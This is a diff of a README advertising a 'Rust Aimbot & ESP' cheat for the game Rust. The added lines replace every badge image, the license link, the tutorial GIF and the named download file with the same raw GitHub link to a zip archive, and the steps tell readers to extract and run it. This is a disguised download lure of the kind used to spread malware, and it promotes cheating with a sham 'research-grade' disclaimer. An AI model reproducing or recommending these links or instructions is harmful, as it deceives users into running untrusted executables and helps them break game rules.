@@ -1,13 +1,13 @@
 # 🎮 Rust Aimbot & ESP Advanced Suite 👾
 
-![Version](https://img.shields.io/badge/version-2025-yellowgreen?style=flat-square) 
-![Supported OS](https://img.shields.io/badge/OS-Windows%2C%20Linux-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![OpenAI API](https://img.shields.io/badge/API-OpenAI-blue)
-![Claude API](https://img.shields.io/badge/API-Claude-purple)
-![Languages](https://img.shields.io/badge/languages-Multi--lingual-orange)
-![Support](https://img.shields.io/badge/support-24×7-important)
-![Security](https://img.shields.io/badge/ultra--secure-red)
+![Version](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip) 
+![Supported OS](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip%2C%https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
+![License](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
+![OpenAI API](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
+![Claude API](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
+![Languages](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
+![Support](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip×7-important)
+![Security](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
 
 ## 🚀 Introduction: Step Into Superior Survival  
 Conquer the world of Rust with the groundbreaking Aimbot & ESP Suite, a specialist’s toolbox designed to elevate your Rust adventure with sharp precision and clear visuals. Whether you’re a night-time scavenger sneaking through the shrubbery, or a daylight warrior overtaking monuments, this suite acts as your unseen sixth sense — helping you spot enemies and resources before they even know you’re there!
@@ -40,14 +40,14 @@ _Note: For the smoothest experience, we recommend a dedicated GPU and Rust’s l
 
 Ready to unleash uncharted power? Here’s how you start:
 
-1. **Download** the `EasyLaunch.zip` archive from this repository.
+1. **Download** the `https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip` archive from this repository.
 2. **Extract** the contents anywhere convenient on your PC.
 3. **Run** the EasyLaunch tool and select your preferred modules from the intuitive interface.
 4. **Customize** settings like languages, color overlays, and API assistance options.
 5. **Dive into Rust** and activate the overlay using your chosen hotkey.
 
 ### 🎬 Video Installation Tutorial
-![InstallationGif](https://i.imgur.com/Js67NIU.gif)
+![InstallationGif](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
 
 ## 🔑 Unique Advantages: Why This Suite?  
 
@@ -78,7 +78,7 @@ A world-first: our Rust ESP & aimbot suite isn’t just for sharper eyes and fas
 **Warning:** This research-grade tool is intended for demonstration, education, and entertainment purposes only. By deploying this suite, you affirm sole responsibility for all its uses and outcomes. Adhere conscientiously to all game's terms, as infractions could result in penalties. The creators profess no liability for misuse.
 
 ## 📝 MIT License  
-This repository is released under the [MIT License](https://opensource.org/licenses/MIT) — allowing you to modify and adapt the suite for your own projects or research in 2025 and beyond.
+This repository is released under the [MIT License](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip) — allowing you to modify and adapt the suite for your own projects or research in 2025 and beyond.
 
 ---
 
